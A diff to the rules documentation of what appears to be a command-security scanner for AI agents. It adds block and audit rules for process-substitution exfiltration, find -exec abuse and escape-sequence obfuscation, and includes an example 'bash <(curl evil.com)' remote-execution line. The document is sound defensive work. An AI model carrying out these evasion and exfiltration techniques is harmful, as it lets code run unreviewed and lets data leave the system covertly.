@@ -6,10 +6,10 @@
 
 | Metric | Count |
 |--------|-------|
-| Terminal rules | 353 |
+| Terminal rules | 361 |
 | MCP rules | 105 |
-| Total rules | 458 |
-| Test cases (TP+TN) | 1128 |
+| Total rules | 466 |
+| Test cases (TP+TN) | 1164 |
 | Kingdoms covered | 9 |
 
 ## Runtime Rules by Kingdom
@@ -61,7 +61,7 @@
 | `ts-block-script-capture-command` | BLOCK | regex | script -c '<command>' records all I/O of the specified command including credentials entered during SSH, sudo, or GPG prompts. The recording file contains cleartext passwords. MITRE T1056.001. |
 | `ts-audit-script-record` | AUDIT | regex | script command recording terminal session to a file — may capture credentials entered in subsequent interactive commands. MITRE T1056.001. |
 
-### data-exfiltration (60 rules)
+### data-exfiltration (62 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -125,6 +125,8 @@
 | `ts-block-xattr-write-subshell` | BLOCK | regex | Writing command substitution output to extended attributes — hides exfiltrated data (credentials, keys, secrets) in file metadata invisible to standard tools. MITRE T1564.004. |
 | `ts-block-xattr-write-backtick` | BLOCK | regex | Writing backtick command output to extended attributes — hides exfiltrated data in file metadata invisible to standard tools. MITRE T1564.004. |
 | `ts-audit-xattr-write` | AUDIT | regex | Writing extended attributes to a file — xattrs are invisible to standard tools and can hide arbitrary data. Legitimate for metadata tagging, but AI agents rarely need this. MITRE T1564.004. |
+| `ts-block-procsub-output-network` | BLOCK | regex | Output process substitution >(network_tool) silently redirects data to a network tool without a visible pipe. Equivalent to 'cmd \| curl' but evades pipe-based detection. Used for covert data exfiltration. MITRE T1048. |
+| `ts-audit-find-exec-network` | AUDIT | regex | find -exec with a network tool detected — could be used to exfiltrate matched files. While some legitimate uses exist (e.g., uploading build artifacts), the combination of file discovery with network egress warrants review. MITRE T1048. |
 
 ### destructive-ops (37 rules)
 
@@ -361,7 +363,7 @@
 | `sc-audit-vector-db-rest-write` | AUDIT | regex | curl POST/PUT to vector database REST API endpoint — injecting content into a RAG knowledge base via HTTP bypasses Python library detection. OWASP LLM08. |
 | `ts-struct-block-npm-registry` | BLOCK | structural | Structural: package install with custom registry override is a supply chain risk. |
 
-### unauthorized-execution (39 rules)
+### unauthorized-execution (45 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -404,6 +406,12 @@
 | `ts-block-strace-credential-sniff` | AUDIT | regex | strace filtering for data-carrying syscalls (read/write/network) — commonly used to sniff credentials and API keys from running processes or commands. MITRE T1057. |
 | `ts-block-ltrace-attach` | BLOCK | regex | ltrace attaching to a running process intercepts library calls including crypto and SSL functions, exposing credentials at the API level. MITRE T1057. |
 | `ts-block-gcore-dump` | BLOCK | prefix | gcore dumps the entire memory of a running process to a file — exposes all heap-allocated secrets, API keys, system prompts, and in-flight credentials. MITRE T1003. |
+| `ts-block-ansic-hex-escape` | BLOCK | regex | ANSI-C quoting with hex escapes ($'\xNN') — encodes arbitrary bytes to evade command detection. An attacker can write $'\x72\x6d' instead of 'rm', completely bypassing string-based rules. Legitimate shell scripts use $'\t' or $'\n', not hex encoding. MITRE T1027.004. |
+| `ts-block-ansic-octal-escape` | BLOCK | regex | ANSI-C quoting with octal escapes ($'\NNN') — encodes arbitrary bytes using octal notation to evade detection. Same evasion technique as hex encoding but using base-8 (e.g., $'\162\155' = rm). MITRE T1027.004. |
+| `ts-block-ansic-unicode-escape` | BLOCK | regex | ANSI-C quoting with unicode escapes ($'\uNNNN') — can encode commands using unicode code points. Also enables homoglyph attacks where visually identical but semantically different characters bypass allowlists. MITRE T1027.004. |
+| `ts-block-procsub-input-exec` | BLOCK | regex | Input process substitution feeding remote content directly to an interpreter (e.g., bash <(curl evil.com)) — pipe-to-shell evasion without a visible pipe character. MITRE T1059. |
+| `ts-block-procsub-eval-remote` | BLOCK | regex | eval/exec consuming input process substitution from a remote downloader — executes unreviewed remote code via named pipe evasion. MITRE T1059. |
+| `ts-block-find-exec-shell` | BLOCK | regex | find with -exec/-execdir invoking a shell interpreter (sh -c, bash -c) enables arbitrary code execution over every matched file. Chains file discovery with unrestricted shell commands — can mass-modify, inject backdoors, or exfiltrate file contents at scale. MITRE T1059.004. |
 
 ### uncategorized (2 rules)
 
@@ -574,12 +582,12 @@
 | Kingdom | TP | TN | Total |
 |---------|----|----|-------|
 | credential-exposure | 112 | 87 | 199 |
-| data-exfiltration | 85 | 53 | 138 |
+| data-exfiltration | 93 | 58 | 151 |
 | destructive-ops | 72 | 44 | 116 |
 | persistence-evasion | 76 | 40 | 116 |
 | privilege-escalation | 101 | 60 | 161 |
 | reconnaissance | 108 | 39 | 147 |
 | supply-chain | 61 | 41 | 102 |
-| unauthorized-execution | 91 | 58 | 149 |
-| **Total** | **706** | **422** | **1128** |
+| unauthorized-execution | 104 | 68 | 172 |
+| **Total** | **727** | **437** | **1164** |
 
